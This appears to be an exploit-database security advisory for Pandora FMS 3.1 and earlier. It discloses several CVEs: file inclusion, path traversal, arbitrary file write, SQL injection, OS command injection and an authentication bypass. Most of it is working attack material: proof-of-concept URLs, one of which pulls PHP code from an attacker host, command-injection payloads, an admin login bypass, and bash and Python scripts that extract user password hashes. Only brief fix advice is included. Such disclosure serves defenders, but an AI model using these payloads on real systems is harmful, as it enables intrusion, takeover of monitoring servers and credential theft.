@@ -1,0 +1,315 @@
+id: 15008
+date: 12/01/2010
+title: Pandora FMS <= 3.1 Mullti Vulnerability
+author: Juan Galiana Lara
+cves: 
+
+=======================================
+Pandora FMS <= 3.1 Mullti Vulnerability
+=======================================
+
+Path Traversal:
+ 
+PHP File Inclusion (or RFI/LFI: Remote/Local file inclusion) -
+CVE-2010-4281 -CVE-2010-4282 - CVSS 8.5/10
+ 
+Parameter 'page' of ajax.php is not properly sanitizing user-supplied
+input. The function safe_url_extraclean is filtering ':' character, and
+it doesn't allow to use the string "http://"; to create urls, but allows
+'/' character and an attacker could reference remote resources via
+Windows UNC files, using //servername//resource/file
+ 
+Note that the first check in safe_url_extraclean is filtering '://', so
+we can bypass the filter easily doing http://http://url, and it only
+strip the first protocol://. However, the last preg_replace strips the :
+character.
+ 
+Proof of concept:
+ 
+UNC: http://servername/pandora_console/ajax.php?page=//server/share/test
+ 
+As well, ajax.php allows to include any php file in the disk
+ 
+filesystem:
+http://servername/pandora_console/ajax.php?page=../../../../../directory/file
+ 
+Character %00 is not allowed due safe_url_extraclean function filtering,
+and is not possible to include other files distinct that php files, but
+still allows . and / characters.
+ 
+ 
+PHP File Inclusion (or RFI Remote file inclusion) - CVE-2010-4283
+- - CVSS 7.9/10
+ 
+An attacker can inject arbitrary PHP code and execute it remotely due
+argv[1] parameter is not filtered in file pandora_diag.php.
+ 
+PoC:
+http://servername/pandora_console/extras/pandora_diag.php?argc=2&argv[1]=http://serverattacker/salsa.php%00
+ 
+Note: that issue needs register_globals set to On to be exploitable.
+ 
+ 
+Path traversal & Local file inclusion vulnerabilities -
+CVE-2010-4282 - CVSS 6.8/10
+ 
+An attacker can include arbitrary files of the filesystem via id
+parameter in file pandora_help.php.
+ 
+ 
+Snippet of vulnerable code:
+ 
+ 24 $id = get_parameter ('id');
+ 25
+ 26 /* Possible file locations */
+ 27 $files = array
+($config["homedir"]."/include/help/".$config["language"]."/help_".$id.".php",
+ 28
+$config["homedir"].ENTERPRISE_DIR."/include/help/".$config["language"]."/help_".$id.".php",
+ 29
+$config["homedir"].ENTERPRISE_DIR."/include/help/en/help_".$id.".php",
+ 30         $config["homedir"]."/include/help/en/help_".$id.".php");
+ 31 $help_file = '';
+ 32 foreach ($files as $file) {
+ 33         if (file_exists ($file)) {
+ 34                 $help_file = $file;
+ 35                 break;
+ 36         }
+ 37 }
+...
+ 62 require_once ($help_file);
+ 
+ 
+Proof of concept:
+ 
+http://servername/pandora_console/general/pandora_help.php?id=/../../../../../../../boot.ini%00
+ 
+This code is platform dependent bug, you can read more at
+http://seclists.org/fulldisclosure/2010/Jul/137
+Only works in windows systems, an attacker can include local file using
+../ characters due parameter id is not filtered
+If magic_quotes_gpc is Off, arbitrary files can be included, like
+boot.ini using NULL character (%00), if not, only php files are allowed
+ 
+ 
+Path traversal & Arbitrary write and delete files - CVE-2010-4282
+- - CVSS 8.0/10
+ 
+In file operation/agentes/networkmap.php the 'layout' parameter is
+handled in an insecure way and it is used to write and delete files on
+the filesystem.
+An attacker could use this parameter to write in arbitrary paths and
+even remove files.
+ 
+Snippet of vulnerable code:
+ 
+32 $layout = (string) get_parameter ('layout', 'radial');
+...
+137 $filename_map = $config["attachment_store"]."/networkmap_".$layout;
+138 $filename_img = "attachment/networkmap_".$layout."_".$font_size;
+139 $filename_dot = $config["attachment_store"]."/networkmap_".$layout;
+...
+157         $fh = @fopen ($filename_dot, 'w');
+158         if ($fh === false) {
+159                 $result = false;
+160         } else {
+161                 fwrite ($fh, $graph);
+162                 $cmd = "$filter -Tcmapx -o".$filename_map." -Tpng
+- -o".$filename_img." ".$filename_dot;
+163                 $result = system ($cmd);
+164                 fclose ($fh);
+165                 unlink ($filename_dot);
+166         }
+...
+178         require ($filename_map);
+ 
+ 
+Character sequences '../' could be used to write files (due -o parameter
+in lines 162 and 163), as well as potentially remove files (line 157,
+161 and 165) or include them (line 178)
+As well like in 5.3 this issue is only exploitable in windows
+environments because the same reason.
+
+----------------------------------------
+
+Blind SQL Injection - CVE-2010-4280 - CVSS: 8.5/10
+ 
+The parameter group_id of operation/agentes/estado_agente.php is
+vulnerable to blind sql injection.
+ 
+ 
+PoC:
+http://host/pandora_console/index.php?sec=estado&sec2=operation/agentes/estado_agente&group_id=24%29%20and%20%28select%20password%20from%20tusuario%20where%20ord%28substring%28password,1,1%29%29=49%20and%20id_user=0x61646d696e%29%20union%20select%20id_agente,%20nombre%20from%20tagente%20where%20id_grupo%20in%20%281
+ 
+ 
+Exploit:
+ 
+#!/bin/bash
+# Pandora Flexible Monitoring System Blind SQL Injection PoC
+# Juan Galiana Lara
+# Gets the md5 hash password from a specific user
+#
+#configure host,cookie&group_id before use it
+#usage
+#$ ./getpassword.sh
+#74b444ff2785ea8bb9ae02c13b6a71f1
+ 
+HOST="HOST"
+TARGET_USER="0x61646d696e" #admin
+PATTERN="Interval"
+COOKIE="rq842tci6e5ib7t918c6sv1ml4"
+CHARSET=(0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v
+w x y z)
+GROUP_ID=2
+ 
+j=1
+while [[ $j -lt 33 ]]; do
+    i=0
+    while [[ $i -lt ${#CHARSET[ () ]} ]]; do
+        c=$(printf '%d' "'${CHARSET[$i]}")
+ 
+URL="http://$HOST/pandora_console/index.php?sec=estado&sec2=operation/agentes/estado_agente&group_id=$GROUP_ID%29%20and%20%28select%20password%20from%20tusuario%20where%20ord%28substring%28password,$j,1%29%29=$c%20and%20id_user=$TARGET_USER%29%20union%20select%20id_agente,%20nombre%20from%20tagente%20where%20id_grupo%20in%20%281";;
+        curl $URL --cookie "PHPSESSID=$COOKIE" 2> /dev/null | grep -q
+$PATTERN;
+        if [ $? -eq 0 ]; then echo -n ${CHARSET[$i]}; break; fi;
+        let i++
+    done;
+    if [[ $i -eq ${#CHARSET[ () ]} ]]; then echo "Something went wrong!";
+exit 1; fi
+    let j++;
+done
+echo
+exit 0
+ 
+ 
+The fix to these kind of issues was the implementation of a generic
+filter against sql injection. A proper fix is planned for a major version.
+
+----------------------------------------
+
+SQL Injection - CVE-2010-4280 - CVSS 8.5/10
+ 
+The parameter id_group when get_agents_group_json is equal to 1 is
+vulnerable to SQL Injection attacks.
+ 
+PoC:
+http://host/pandora_console/ajax.php?page=operation/agentes/ver_agente&get_agents_group_json=1&id_group=1/**/and/**/1=0/**/union/**/select/**/id_user,password/**/from/**/tusuario
+ 
+ 
+Exploit:
+ 
+# Pandora Flexible Monitoring System SQL Injection PoC
+# Juan Galiana Lara
+# Gets the list of users and password from the database
+#
+#configure cookie&host before use it
+#usage
+#python sqlinj_users.py
+#admin:75b756ff2785ea8bb9ae02c13b6a71f1
+#...
+ 
+import json
+import urllib2
+ 
+headers = {"Cookie": "PHPSESSID=a4s3nf1tqv2fau8s6qhi6rutp9dahe9o"}
+ 
+url = "http://HOST/pandora_console/ajax.php";
+url+=
+"?page=operation/agentes/ver_agente&get_agents_group_json=1&id_group=1"
+url+=
+"/**/and/**/1=0/**/union/**/select/**/id_user,password/**/from/**/tusuario"
+ 
+req = urllib2.Request(url,headers=headers)
+resp = urllib2.urlopen(req)
+ 
+users = json.read(resp.read())
+for user in users:
+    print(user["id_agente"]+":"+user["nombre"])
+ 
+ 
+The fix to these kind of issues was the implementation of a generic
+filter against sql injection. A proper fix is planned for a major version.
+
+----------------------------------------
+
+OS Command Injection - CVE-2010-4278 - CVSS 9/10
+ 
+The layout parameter in file operation/agentes/networkmap.php is not
+properly filtered and allows an attacker to inject OS commands.
+ 
+Snippet of vulnerable code (file operation/agentes/networkmap.php):
+ 
+32 $layout = (string) get_parameter ('layout', 'radial');
+...
+137 $filename_map = $config["attachment_store"]."/networkmap_".$layout;
+138 $filename_img = "attachment/networkmap_".$layout."_".$font_size;
+139 $filename_dot = $config["attachment_store"]."/networkmap_".$layout;
+...
+162                 $cmd = "$filter -Tcmapx -o".$filename_map." -Tpng
+- -o".$filename_img." ".$filename_dot;
+163                 $result = system ($cmd);
+ 
+PoC:
+ 
+http://servername/pandora_console/index.php?login=1&login=1&sec=estado&sec2=operation/agentes/networkmap&refr=0&layout=1;uname%20-a;
+http://servername/pandora_console/index.php?login=1&sec=estado&sec2=operation/agentes/networkmap&refr=0&layout=1;id;
+ 
+If we use vulnerability #1 (that permits bypass the authentication
+system and login as admin) with this issue, the CVSS will be 10/10.
+
+----------------------------------------
+
+Authentication bypass - CVE-2010-4279 - CVSS: 10/10
+ 
+An attacker could access to any account user, including admin, using the
+"hash login" authentication process. This kind of authentication method
+works providing a username and a hash. The issue could be exploited
+remotely providing a username and the md5 of it when
+$config['loginhash_pwd'] is empty, that in fact is the default
+configuration.
+ 
+Snippet of vulnerable code in index.php:
+ 
+136 // Hash login process
+137 if (! isset ($config['id_user']) && isset ($_GET["loginhash"])) {
+138         $loginhash_data = get_parameter("loginhash_data", "");
+139         $loginhash_user = get_parameter("loginhash_user", "");
+140
+141         if ($loginhash_data ==
+md5($loginhash_user.$config["loginhash_pwd"])) {
+142                 logon_db ($loginhash_user, $_SERVER['REMOTE_ADDR']);
+143                 $_SESSION['id_usuario'] = $loginhash_user;
+144                 $config["id_user"] = $loginhash_user;
+ 
+ 
+ 
+Proof of concept:
+ 
+http://servername/pandora_console/index.php?loginhash_data=21232f297a57a5a743894a0e4a801fc3&loginhash_user=admin&loginhash=1
+ 
+Got it! admin! :)
+ 
+By default, any installation of this software allows unauthenticated
+attackers to perform an authentication bypass and a privilege escalation
+to admin.
+ 
+ 
+1.1) Additionally, a manual modification in order to use the hash_hmac
+function instead of the weak statement md5 ( $string . $KEY) is
+encouraged for security purposes.
+ 
+Snippet of code (index.php, version 3.1.1):
+ 
+145 // Hash login process
+(...)
+150         if ($config["loginhash_pwd"] != "" && $loginhash_data ==
+md5($loginhash_user.$config["loginhash_pwd"])) {
+ 
+In line 150, use
+hash_hmac("sha256",$loginhash_user,$config["loginhash_pwd"]), instead of
+md5($lioginhash_user.$config["loginhash_pwd"])
+
+
+
+
+#  0day.today [2023-03-24]  #
